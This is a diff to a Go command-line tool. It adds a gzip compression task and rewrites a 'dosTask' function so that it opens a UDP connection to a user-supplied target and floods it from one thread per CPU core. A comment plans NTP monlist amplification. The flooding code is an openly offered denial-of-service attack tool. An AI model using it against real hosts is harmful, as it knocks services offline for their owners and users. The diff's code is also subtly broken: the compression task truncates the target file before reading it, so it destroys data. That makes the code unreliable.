@@ -18,10 +18,12 @@ package main
 
 import (
 	"bufio"
+	"compress/gzip"
 	"crypto/sha1"
 	"encoding/base64"
 	"fmt"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"net/smtp"
 	"os"
@@ -29,6 +31,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/shirou/gopsutil/cpu"
 	"github.com/daviddengcn/go-colortext"
 	"github.com/jordan-wright/email"
 )
@@ -176,6 +179,32 @@ func auditTask(target string) {
 	}
 }
 
+func compressTask(target string) {
+	checkTarget(target)
+
+	file, err := os.Create(target)
+	if err != nil {
+		ct.Foreground(ct.Red, true)
+		panic(err.Error())
+	}
+	defer file.Close()
+
+	os.Rename(target, target+".gz")
+
+	w := gzip.NewWriter(file)
+	w.Write(readFileIntoByte(target))
+	defer w.Close()
+
+	ct.Foreground(ct.Green, true)
+	println("finished!")
+}
+
+// TODO: if contains .gz
+func decompressTask(target string) {
+	ct.Foreground(ct.Red, true)
+	println("Not a working feature yet!")
+}
+
 // TODO: use set length
 // Generates a random string for use as a password
 func generatePasswordTask() {
@@ -183,11 +212,21 @@ func generatePasswordTask() {
 	println("Password:", randomString())
 }
 
-// TODO: add amplification
-// TODO: more testing
-// Indefinitely runs colly on an address
+// TODO: add amplification - such as NTP monlist
+// Indefinitely sends data to target
 func dosTask(target string) {
-	checkTarget(target)                                                // make sure target is valid
+	checkTarget(target) // make sure target is valid
+
+	conn, err := net.Dial("udp", target) // setup connection object
+	defer conn.Close()                   // make sure to close connection when finished
+	if err != nil {
+		ct.Foreground(ct.Red, true)
+		panic(err.Error())
+	} else { // nothing bad happened when connecting to target
+		ct.Foreground(ct.Green, true)
+		println("Checks passed!")
+	}
+
 	ct.Foreground(ct.Red, true)                                        // set text color to bright red
 	println("\nWarning: you are solely responsible for your actions!") // disclaimer
 	println("ctrl + c to cancel")
@@ -196,8 +235,16 @@ func dosTask(target string) {
 
 	time.Sleep(10 * time.Second) // 10 second delay - give chance to cancel
 
-	for true { // DOS loop
-		collyAddress(target, false, true)
+	threads, err := cpu.Counts(false) // get threads on system to set DOS thread limit
+	if err != nil {
+		ct.Foreground(ct.Red, true) // set text color to bright red
+		panic(err.Error())
+	}
+
+	for i := 0; i < threads; i++ { // create DOS threads within limit
+		go dos(conn)                   // create thread
+		ct.Foreground(ct.Yellow, true) // set text color to dark yellow
+		println("Thread created!")
 	}
 }
 
